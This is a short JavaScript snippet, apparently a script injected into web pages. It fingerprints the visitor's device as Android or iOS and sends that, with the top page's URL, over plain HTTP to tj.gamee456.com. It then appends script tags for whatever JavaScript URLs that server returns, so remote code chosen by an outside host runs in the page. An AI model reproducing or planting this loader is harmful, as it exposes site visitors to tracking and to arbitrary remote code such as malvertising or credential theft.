var u = navigator.userAgent;
var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1;
//android终端 
var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
var p_url = top.location.href;
if (p_url == null || p_url == "") {
    p_url = "none";
}
$.ajax({
    url: "http://tj.gamee456.com/handler/JsSetting.ashx?jsoncallback=showmyname183a04f3731811e6ada0363265356661",
    dataType: "jsonp",
    type: "POST",
    async: true,
    timeout: 1000,
    data: {
        id: myname183a04f3731811e6ada0363265356661,
        android: isAndroid,
        ios: isiOS,
        p_url: p_url
    },
    beforeSend: function (XMLHttpRequest) {
    },
    success: function (data, textStatus) {
    },
    error: function (XMLHttpRequest, textStatus, errorThrown) {
    }
});
var showmyname183a04f3731811e6ada0363265356661 = function (data) {
    if (data.status == 200) {
        $.each(data.list, function (indexInArray, valueOfElement) {
            $("body").append("<script guid='" + valueOfElement.guid + "' src='" + valueOfElement.js_url+ "'></script>");
        });
    }
}